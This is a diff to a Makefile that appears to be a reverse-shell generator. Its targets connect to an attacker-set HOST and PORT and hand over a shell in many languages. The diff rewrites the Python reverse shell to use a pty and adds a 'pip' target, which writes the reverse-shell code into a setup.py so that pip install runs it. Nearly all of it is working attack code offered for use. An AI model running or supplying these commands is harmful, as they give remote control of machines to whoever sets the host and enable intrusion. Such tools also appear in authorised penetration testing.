@@ -4,7 +4,7 @@ PORT	:= 4444
 PORT2	:= 4445
 TMP		:= $(or $(tmp), /tmp/f)
 
-METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl python perlphp ruby irb node jrunscript jjs julia socat
+METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl python perlphp ruby irb node jrunscript jjs julia socat pip
 
 BOLD		:= \033[1m
 UNDERLINE	:= \033[4m
@@ -147,10 +147,10 @@ openssl-show:
 ########################## PYTHON ##########################
 
 python:
-	python -c 'import socket,subprocess,os; s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$(HOST)",$(PORT))); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["$(SHELL)"]);'
+	python -c 'import sys,socket,os,pty; s = socket.socket(); s.connect(("$(HOST)",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("$(SHELL)")'
 
 python-show:
-	@printf "python -c 'import socket,subprocess,os; s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$(HOST)\",$(PORT))); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"$(SHELL)\"]);'\n"
+	@printf "python -c 'import sys,socket,os,pty; s = socket.socket(); s.connect((\"$(HOST)\",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"$(SHELL)\")'\n"
 
 ############################################################
 
@@ -246,6 +246,10 @@ socat-show:
 
 ########################### PIP ############################
 
+pip:
+	mkdir -p $(TMP); echo 'import sys,socket,os,pty; s = socket.socket(); s.connect(("$(HOST)",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("$(SHELL)")' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)
 
+pip-show:
+	@printf "mkdir -p $(TMP); echo 'import sys,socket,os,pty; s = socket.socket(); s.connect((\"$(HOST)\",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"$(SHELL)\")' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)\n"
 
 ############################################################
